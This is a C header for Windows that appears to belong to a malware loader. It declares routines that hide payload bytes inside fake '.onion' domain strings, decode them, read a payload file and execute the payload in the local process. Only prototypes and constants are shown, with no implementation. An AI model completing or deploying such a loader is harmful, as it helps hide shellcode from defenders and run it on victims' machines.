#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H


#define WIN32_LEAN_AND_MEAN
#define BYTES_PER_DOMAIN  35
#define CHARS_PER_DOMAIN  56   /* 35*8/5 = 56, no padding */
#define ONION_SUFFIX      ".onion"
#define DOMAIN_LEN        (CHARS_PER_DOMAIN + sizeof(ONION_SUFFIX)) /* 63 */

static const char BASE32_ALPHABET[] = "abcdefghijklmnopqrstuvwxyz234567";

VOID base32_encode_35(const BYTE* in, char* out);
BOOL base32_decode_35(const char* in, BYTE* out);
char** ObfuscateToOnions(const BYTE* payload, SIZE_T len, SIZE_T* out_count);
BOOL DeobfuscateFromOnions(char** domains, SIZE_T count, SIZE_T* out_len, BYTE** pPayload);
BOOL ReadPayloadFile(const char* FileInput, PDWORD sPayloadSize, unsigned char** pPayloadData);
VOID LocalPayloadExecute(PBYTE Payload, SIZE_T PayloadLength);
#endif // !COMMON_H
